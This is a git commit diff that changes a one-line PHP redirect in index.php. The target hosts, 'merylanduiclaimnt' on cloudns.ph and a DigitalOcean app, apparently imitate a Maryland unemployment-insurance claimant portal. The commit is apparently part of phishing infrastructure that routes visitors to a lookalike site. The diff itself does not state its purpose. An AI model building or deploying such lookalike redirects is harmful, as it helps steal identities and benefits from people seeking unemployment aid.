4eba61878de372bf6469ee8fdcca2045ac2fab9d
ramon014 <100961311+ramon014@users.noreply.github.com>
2022-03-05 03:22:03 +0800

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: merylanduiclaimnt.cloudns.ph"); 
+header("Location: https://merylanduiclaimnt-69n27.ondigitalocean.app/merylanduiclaimnt.cloudns.ph"); 
   
 exit; 
 ?> 
